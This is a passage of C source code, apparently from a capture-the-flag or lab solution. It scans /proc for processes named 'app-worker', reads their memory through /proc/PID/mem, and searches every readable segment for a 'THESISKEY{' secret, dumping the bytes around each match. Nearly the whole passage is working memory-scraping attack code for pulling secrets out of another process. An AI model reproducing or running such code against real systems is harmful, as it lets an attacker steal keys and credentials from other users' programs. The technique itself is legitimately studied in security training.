        char *endp;
        long pid = strtol(ent->d_name, &endp, 10);
        if (*endp != '\0' || pid <= 0) continue;

        // Check cmdline for app-worker
        char cmdline_path[64];
        snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%ld/cmdline", pid);
        FILE *cf = fopen(cmdline_path, "r");
        if (!cf) continue;
        char cmd[256] = {0};
        fread(cmd, 1, 255, cf);
        fclose(cf);

        // Only process app-worker
        if (!strstr(cmd, "app-worker")) continue;

        fprintf(out, "Found app-worker PID %ld\n", pid);
        fflush(out);

        char maps_path[64], mem_path[64];
        snprintf(maps_path, sizeof(maps_path), "/proc/%ld/maps", pid);
        snprintf(mem_path, sizeof(mem_path), "/proc/%ld/mem", pid);

        FILE *maps_f = fopen(maps_path, "r");
        if (!maps_f) { fprintf(out, "cannot open maps\n"); continue; }

        int mem_fd = open(mem_path, O_RDONLY);
        if (mem_fd < 0) { fprintf(out, "cannot open mem\n"); fclose(maps_f); continue; }

        char line[256];
        while (fgets(line, sizeof(line), maps_f)) {
            unsigned long start, end;
            char perms[8];
            if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) != 3) continue;
            if (perms[0] != 'r') continue;

            unsigned long size = end - start;
            if (size > 64 * 1024 * 1024) continue;

            char *buf = malloc(size + 512);
            if (!buf) continue;
            memset(buf + size, 0, 512);

            ssize_t n = pread(mem_fd, buf, size, (off_t)start);
            fprintf(out, "  Segment %s: read %ld bytes\n", line[strlen(line)-1]=='\n'?({line[strlen(line)-1]=0;line;}):line, (long)n);
            fflush(out);

            if (n > 0) {
                // Search for THESISKEY with surrounding context (allow newlines)
                for (ssize_t i = 0; i < n - 9; i++) {
                    if (buf[i] == 'T' && buf[i+1] == 'H' && buf[i+2] == 'E' && 
                        buf[i+3] == 'S' && buf[i+4] == 'I' && buf[i+5] == 'S' &&
                        buf[i+6] == 'K' && buf[i+7] == 'E' && buf[i+8] == 'Y' &&
                        buf[i+9] == '{') {

                        // Print 300 bytes as hex
                        fprintf(out, "=== THESISKEY found at offset %ld ===\n", (long)i);
                        fprintf(out, "HEX(300): ");
                        for (int k = 0; k < 300 && i+k < n; k++) {
                            fprintf(out, "%02x ", (unsigned char)buf[i+k]);
                        }
                        fprintf(out, "\n");

                        // Print as string (replace \0 and \n with visible chars)
                        fprintf(out, "STR: ");
                        for (int k = 0; k < 300 && i+k < n; k++) {
                            unsigned char c = (unsigned char)buf[i+k];
